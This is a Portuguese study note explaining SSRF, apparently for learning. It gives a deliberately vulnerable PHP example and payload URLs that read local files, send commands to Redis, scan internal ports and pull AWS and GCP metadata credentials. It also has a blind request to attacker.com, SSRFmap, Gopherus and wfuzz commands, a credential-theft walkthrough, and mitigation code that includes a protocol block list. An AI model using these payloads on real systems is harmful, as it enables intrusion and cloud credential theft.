2025-08-02 18:31

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[SSRF]]

----
# Introdução

***Server-Side Request Forgery* (SSRF)** é uma vulnerabilidade que permite a um atacante induzir um servidor a fazer requisições HTTP para domínios ou sistemas internos não intencionados. Essa falha ocorre quando um aplicativo web não valida adequadamente URLs fornecidos pelo usuário antes de acessá-las.

## Impactos do SSRF

- Acesso a serviços internos (ex.: bancos de daos, APIs internas)
- Leitura de metadados de cloud (AWS, GCP, Azure)
- Bypass de firewalls  e scanners de rede
- Exploração de serviços vulneráveis (Redis, Memcached, Elasticsearch)
- Ataques em redes internas (ex.: port scanning)

---
# Como o SSRF Funciona?

## Fluxo básico de um Ataque SSRF

1. **Aplicação aceita uma URL controlada pelo usuário** (ex.: webhook, importação de dados).
2. **Servidor faz uma requisição para essa URL.**
3. **Atacante manipula a URL para acessar sistemas interno ou externos.**

## Exemplo de Código vulnerável (PHP)

```php
<?php
$url = $_GET['url'];  // Exemplo: ?url=http://api.internal/admin
$data = file_get_contents($url);
echo $data;
?>
```

Se um atacante enviar

```text
http://site.com/?url=file:///etc/passwd
```

O servidor pode ler arquivos locais.

---
# Tipos de SSRF

## a) SSRF Básico (Leitura de Dados)

- Acesse recursos internos:

```text
http://vulnerable.com/fetch?url=http://localhost:8080/admin
```

## b) Blind SSRF (Sem Resposta Direta)

- O servidor faz a requisição, mas não retorna a reposta (útil para ataques em segundo plano).
- Exemplo:

```http
POST /webhook HTTP/1.1
Host: vulnerable.com
Content-Type: application/json

{"url":"http://attacker.com/exploit"}
```

## c) SSRF com Protocolos Especiais

- `file://` - Lê arquivos locais:

```text
http://vulnerable.com/fetch?url=file:///etc/passwd
```

- `dict://` - Interage com serviços como Redis:

```text
http://vulnerable.com/fetch?url=dict://localhost:6379/SET%20key%20hacked
```

- `gopher://` - Envia requisições brutas (explora Redis, MySQL, etc.).

---
# Exploração Avançada de SSRF

## a) Ataque de Metadados de Cloud

- AWS Metadata API:

```http
http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

- Google Cloud Metadata:

```http
http://vulnerable.com/fetch?url=http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

- Azure Metadata:

```http
http://vulnerable.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

## Port Scanning Interno

- Verifica portas abertas em `localhost`:

```http
http://vulnerable.com/fetch?url=http://localhost:22   # SSH
http://vulnerable.com/fetch?url=http://localhost:3306 # MySQL
```

## c) Ataque a Bancos de Dados e Serviços

- **Redis** (RCE):

```http
http://vulnerable.com/fetch?url=gopher://localhost:6379/_SET%20hacked%20true
```

- **Elasticsearch:**

```http
http://vulnerable.com/fetch?url=http://localhost:9200/_search?q=password
```

---
# SSRF na Cloud

Ultimamente, uma atenção maior foi dada para o Server Side Request Forgery (SSRF) devido à utilização dessa vulnerabilidade para exploração de aplicações em nuvem.

Tendo como exemplo o provedor de nuvem AWS, é bastante comum de se ver aplicações hospedadas em um Amazon Elastic Compute Cloud (Amazon EC2) e, com isso, atacantes acabam obtendo um meio de acessar credenciais de metadados de máquinas EC2 por meio do SSRF.

No [exemplo descrito na página Hacking The Cloud](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/), é possível ver que a maioria das instâncias do EC2 possuem acesso ao [serviço de metadados](https://docs.aws.amazon.com/pt_br/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) que contém informações, como endereço IP da instância, credenciais das [IAM roles](https://docs.aws.amazon.com/pt_br/IAM/latest/UserGuide/id_roles.html) e o nome do security group e, esse acesso é feito por meio do endereço de IP `169.254.169.254`.

Tendo em vista, em um servidor web rodando na porta 80 de uma instância do EC2 que possui uma vulnerabilidade SSRF, conseguimos fazer requisições GET com outros endereços por meio de parâmetros na URL, como por exemplo, o `169.254.169.254` para acessar os metadados:

![[Pasted image 20250802192206.png]]

Com isso, conseguimos acessar o diretório `meta-data` que, caso tenha IAM roles, irá possuir uma pasta `iam/security-credentials`. Então podemos buscar `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

Isso retornará o nome da IAM role que armazena as credenciais. No exemplo abaixo, o nome da função é `ec2-default-ssm`:

![[Pasted image 20250802192227.png]]

Com isso, podemos acessar `http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm/`:

![[Pasted image 20250802192241.png]]

E voilà! Conseguimos obter credenciais que podem ser usadas na AWS CLI ou até mesmo fazer chamadas de API como a função do IAM.

Toda essa prática pode parecer complexa, mas o importante é ver até onde conseguimos chegar por meio do SSRF. E caso você tenha interesse em se aprofundar em AWS e ver maneiras de configurar as credenciais de forma segura, confira [nossa Formação Amazon Web Services](https://cursos.alura.com.br/formacao-amazon-web-services).

---
# Ferramentas para Detecção e Exploração

## a) Ferramentas de Teste Manual

- **Burp Suite** (Scanner + Collaborator para Blind SSRF)
- **Postman** (Testar APIs vulneráveis)
- **culr** (Verificar respostas de URLs controladas)

## b) Ferramentas Automatizadas

- **SSRFmap** (Exploração avançada de SSRF)

```bash
git clone https://github.com/swisskyrepo/SSRFmap
python3 ssrfmap.py -r request.txt -p url=http://target
```

- **Gopherus** (Gera payloads para Redis, MySQL, etc.)

```bash
python gopherus.py --exploit redis
```

## c) Wordlists para Fuzzing

- **PayloadsAllTheThings** (SSRF)

```bash
wfuzz -c -w /usr/share/seclists/Fuzzing/SSRF.txt -u "http://site.com/fetch?url=FUZZ"
```

---
# Mitigação e Prevenção

## a) Validação de URLs

- **Whitelist de domínios permitidos:**

```php
$allowed = ['https://api.trusted.com'];
if (!in_array($_GET['url'], $allowed)) {
    die("URL bloqueada!");
}
```

## b) Bloqueio de Protocolos Perigosos

- Remover `file://`, `gopher://`, `dict://`:

```php
if (preg_match('/^(file|gopher|dict):/i', $_GET['url'])) {
    die("Protocolo proibido!");
}
```

## c) Firewall de Aplicação (WAF)

- Regras para bloquear requisições a IPs internos (`127.0.0.1`, `192.168.x.x`).

## d) Configurações de Rede

- **Restringir acesso a metadados** em cloud (AWS IAM, GCP Service Accounts).
- **Segmentação de rede** (VLANs, firewalls internos).

## e) Usar Bibliotecas Seguras

- **Evitar** `file_get_contents` em PHP. Preferir `curl` com restrições:

```php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://allowed.com/api");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
$data = curl_exec($ch);
```

---
# Exemplo Prático de Exploração

## Passo a Passo (SSRF → Leitura de Metadados AWS)

1. **Identificar parâmetro vulnerável:**

```http
http://vulnerable.com/fetch?url=https://google.com
```

2. **Testar acesso a metadados AWS:**

```http
http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/
```

3. **Coletar credenciais IAM:**

```http
http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/Admin
```

4. **Usar credenciais para acesso não autorizado à AWS.**

---
# Outro Exemplo Prático

 Utilizando o Burpsuite, é possível encontrar algo interessante em uma funcionalidade de listar quantos produtos tem no estoque.

Ao buscar a quantidade de bicicletas disponíveis no estoque de Paris o Burpsuite interceptou a aplicação busca essa informação em uma outra API.]

![[Pasted image 20250802191700.png]]

Ao alterar a requisição de `stockapi` da página por `http://localhost/admin` é  possível incorporar a página localhost de administrador dentro de página original.

![[aula2-img17.gif]]

---
# Conclusão

SSRF é uma vulnerabilidade crítica que pode levar a vazamento de dados internos, RCE e comprometimento de redes. A prevenção inclui:

	✔ **Validação estrita de URLs**  
	✔ **Bloqueio de protocolos perigosos**  
	✔ **Configurações seguras em ambientes cloud**

---
# Referências

- [OWASP SSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%2520Side%2520Request%2520Forgery)